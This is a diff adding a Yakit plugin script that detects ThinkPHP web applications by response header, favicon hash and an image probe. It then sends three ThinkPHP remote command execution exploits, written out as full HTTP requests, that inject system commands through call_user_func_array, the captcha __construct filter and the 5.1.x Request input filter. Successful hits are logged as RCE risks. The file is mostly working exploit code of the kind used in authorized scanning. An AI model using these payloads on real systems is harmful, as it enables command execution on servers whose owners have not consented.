@@ -1,0 +1,123 @@
+payloads = [
+    {
+        "name":"thinkphp5.0.23 5.0.7 ~ 5.0.23命令执行",
+        "payload":`GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={{url({{params(cmd)}})}} HTTP/1.1
+Host: {{params(target)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Connection: close
+Content-Length: 0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
+
+`},
+
+{
+    "name":"Thinkphp captcha命令执行",
+    "payload":`POST /index.php HTTP/1.1
+Host: {{params(target)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: no-cache
+Connection: close
+Content-Length: 52
+Content-Type: application/x-www-form-urlencoded
+Origin: http://123.58.236.76:59844
+Pragma: no-cache
+Referer: http://123.58.236.76:59844/index.php?s=index/index/index
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
+
+s={{url({{params(cmd)}})}}&_method=__construct&filter%5B%5D=system
+
+`},{
+        "name":"5.1.x命令执行",
+        "payload":`GET /index.php?s=index/\think\Request/input&filter=system&data={{url({{params(cmd)}})}} HTTP/1.1
+Host: {{params(target)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Connection: close
+Content-Length: 0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
+
+`}]
+
+thinkphpFingers = ["X-Powered-By: .*((?i)thinkphp).*"]
+
+testExp = fn(rootUrl){
+    yakit_output(sprintf("%s发现thinkphp框架",rootUrl))
+    host,port,_ = str.ParseStringToHostPort(rootUrl)
+    target = sprintf("%s:%d",host,port)
+    for _,payload = range payloads{
+        out = ""
+        payloadR = ""
+        randomStr = str.RandStr(20)
+        result = codec.Md5(randomStr)
+        cmd = sprintf("echo -n '%v' | md5sum", randomStr)
+        rsp,req,_ = poc.HTTP(payload["payload"], poc.params({"cmd": cmd,"target": target}))
+        headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+        // println(string(headers))
+        if str.MatchAllOfSubString(body, result){
+            payloadR,_ = str.SplitHTTPHeadersAndBodyFromPacket(req)
+            out = sprintf("%s存在漏洞, pocName:%s, OS: Linux",rootUrl,payload["name"])
+        }
+
+        rsp,req,_ = poc.HTTP(payload["payload"], poc.params({"cmd": "dir C:\\Windows\\","target": target}))
+        headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+        // println(string(headers))
+        if str.MatchAllOfSubString(body, "system.ini"){
+            payloadR,_ = str.SplitHTTPHeadersAndBodyFromPacket(req)
+            out = sprintf("%s存在漏洞, pocName:%s, OS: Windows",rootUrl,payload["name"])
+        }
+        if out != ""{
+            yakit_output(out)
+            risk.NewRisk(rootUrl,risk.title(sprintf("%s存在RCE漏洞",rootUrl)),risk.details(out),risk.type("RCE"),risk.payload(payloadR))
+        }
+    }
+}
+
+checkHeader = fn(headers){
+    for _,thinkphpFinger = range thinkphpFingers{
+        if re.Match(thinkphpFinger,headers) {
+            return true
+        }
+    }
+    return false
+}
+
+chechIcon1 = fn(rootUrl){
+    u = rootUrl+"?c=4e5e5d7364f443e28fbf0d3ae744a59a"
+    rsp,_ = http.Get(u)
+    rspB,_ = http.dump(rsp)
+    header,body = str.SplitHTTPHeadersAndBodyFromPacket(rspB)
+    return str.Contains(string(body),"IHDR") && (str.Contains(string(body),"PNG") || str.Contains(string(body),"JPEG")) 
+}
+chechIcon2 = fn(rootUrl){
+    hash, err = http.RequestFaviconHash(rootUrl+"favicon.ico")
+    return hash == "1165838194"
+}
+
+
+# mirrorNewWebsite 每新出现一个网站，这个网站的第一个请求，将会在这里被调用！
+mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    rootUrl = str.ParseStringUrlToWebsiteRootPath(url)
+    headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+    if checkHeader(headers) || chechIcon2(rootUrl) || chechIcon1(rootUrl){
+        testExp(rootUrl)
+    }
+    
+}
+
+# mirrorNewWebsitePath 每新出现一个网站路径，关于这个网站路径的第一个请求，将会在这里被传入回调
+mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    // rootUrl = str.ParseStringUrlToWebsiteRootPath(url)
+    // if str.EndsWith(url, "favicon.ico") && codec.MMH3Hash32(codec.EncodeBase64(rsp)) == "1165838194"{
+    //     testExp(rootUrl)
+    // }
+}
